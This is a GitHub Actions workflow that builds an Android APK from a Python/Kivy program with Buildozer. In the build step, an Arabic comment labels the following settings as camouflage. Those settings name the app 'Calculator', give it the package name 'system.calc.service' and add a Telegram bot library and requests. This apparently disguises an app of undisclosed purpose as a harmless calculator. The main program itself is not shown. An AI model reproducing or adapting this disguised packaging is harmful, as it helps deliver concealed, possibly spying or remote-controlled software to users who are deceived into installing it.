name: Build APK
on: [push, pull_request, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: 3.9
      - name: Install dependencies
        run: |
          pip install buildozer cython==0.29.33
          sudo apt-get install -y scons libncurses5-dev libncursesw5-dev libyaml-dev libssl-dev
      - name: Fix Aidl and Android Licenses
        run: |
          # تثبيت أدوات البناء اللازمة وحل مشكلة Aidl
          yes | sdkmanager --sdk_root=$ANDROID_HOME --licenses || true
          sdkmanager --sdk_root=$ANDROID_HOME "build-tools;30.0.3" "platform-tools" "platforms;android-31"
      - name: Build APK
        run: |
          yes | buildozer init
          # إعدادات التمويه واستدعاء الكود من المجلد الصحيح
          sed -i 's/requirements = python3,kivy/requirements = python3,kivy,requests,pytelebotapi/g' buildozer.spec
          sed -i 's/title = My Application/title = Calculator/g' buildozer.spec
          sed -i 's/package.name = myapp/package.name = system.calc.service/g' buildozer.spec
          # نسخ الملفات للمكان الصحيح للبناء
          cp examplePythonProgram/main.py .
          cp examplePythonProgram/icon.png . || true
          # أمر البناء مع تجاهل الأخطاء غير المؤثرة
          buildozer -v android debug
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: calculator-apk
          path: bin/*.apk
